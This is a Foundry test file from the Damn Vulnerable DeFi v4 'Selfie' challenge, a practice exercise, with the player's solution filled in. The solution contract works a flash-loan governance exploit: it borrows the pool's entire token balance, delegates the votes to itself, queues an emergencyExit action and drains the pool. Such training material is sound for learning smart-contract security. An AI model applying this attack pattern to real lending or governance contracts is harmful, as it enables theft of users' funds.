// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    /**
     * CODE YOUR SOLUTION HERE
     */
    function test_selfie() public checkSolvedByPlayer {
        SelfieSolution solution = new SelfieSolution();
        solution.start(pool);
        skip(2 days);  
        solution.triggerAction(recovery);
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}

contract SelfieSolution {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;
    SelfiePool _pool;
    SimpleGovernance _governance;

    function start(SelfiePool pool) external {
        _pool = pool;
        pool.flashLoan(IERC3156FlashBorrower(address(this)), address(pool.token()), TOKENS_IN_POOL, "");
    }
    function onFlashLoan(address, address, uint256, uint256, bytes calldata) external returns (bytes32) {
        addDrainAction();
        return CALLBACK_SUCCESS;
    }
    function addDrainAction() internal {
        _pool = SelfiePool(msg.sender);
        _governance = SimpleGovernance(_pool.governance());
        DamnValuableVotes token = DamnValuableVotes(address(_pool.token()));
        token.approve(address(_pool), TOKENS_IN_POOL);
        token.delegate(address(this));
        console.log("Number of token: %d", token.balanceOf(address(this)));
        console.log("Number of votes: %d", token.getVotes(address(this)));
        _governance.queueAction(address(_pool), 0, abi.encodeWithSignature("emergencyExit(address)", address(this)));
    }
    function triggerAction(address recovery) external {
        _governance.executeAction(1);
        _pool.token().transfer(recovery, TOKENS_IN_POOL);
    }
}